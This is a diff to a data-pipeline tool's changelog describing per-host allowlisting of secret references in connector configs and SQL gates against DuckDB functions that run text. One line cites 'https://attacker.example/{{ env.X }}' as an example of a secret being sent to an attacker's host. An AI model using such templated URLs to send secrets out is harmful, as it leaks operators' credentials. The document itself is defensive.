@@ -267,10 +267,13 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   renders only for the endpoints the operator paired it with, `NAME@host` in
   `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the bare `NAME` for an address the policy reads no host
   from (`bootstrap.servers`, `database.hostname`). Airbyte's `destination_config` replaces what it
-  would derive, so it is a destination of its own, and so is Kafka Connect's `schema_registry`,
-  whose URL is copied into the source and the sink config (`https://attacker.example/{{ env.X }}`
-  there sent X to the registry's host). A map written as a list of key/value pairs, which a runner
-  merges as it merges a map, is judged as the map it makes.
+  would derive, so it is a destination of its own. So is Debezium's `extra_config`, except for the
+  settings that move the source's host or credential (`database.hostname`, `database.password`), which
+  are judged with the source: the source's password never goes to the Kafka brokers it names for the
+  schema history. Kafka Connect's `schema_registry` is judged with the converter settings of the sink
+  config (`value.converter.basic.auth.user.info`), which reach the registry its URL names
+  (`https://attacker.example/{{ env.X }}` there sent X to that host). A map written as a list of
+  key/value pairs, which a runner merges as it merges a map, is judged as the map it makes.
 - **The SQL gates refuse DuckDB's logging functions and the table functions that run text.**
   `compile_free_form_sql` (the MCP output port's `query_sql`),
   `validate_sql_expression_allowlist` and `guard_against_injection_markers` now refuse a call to
@@ -394,8 +397,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `destination_config` that holds `{{ env.NAME }}` beside a URL or a host (an HTTP sink's
   `http.api.url`, an Iceberg `iceberg.catalog.uri`, an S3 endpoint) now stops until the operator
   lists `NAME@<that host>` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`; a host the policy reads no
-  name for (`bootstrap.servers`) takes the bare `NAME`. A map with no URL or host in it, and a
-  loopback one, are unchanged.
+  name for (`bootstrap.servers`, a JDBC URL) takes the bare `NAME`, even when it names this machine. A
+  map with no URL or host in it, and one whose URLs the policy reads and that name this machine, are
+  unchanged.
 - **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
   fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
   gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
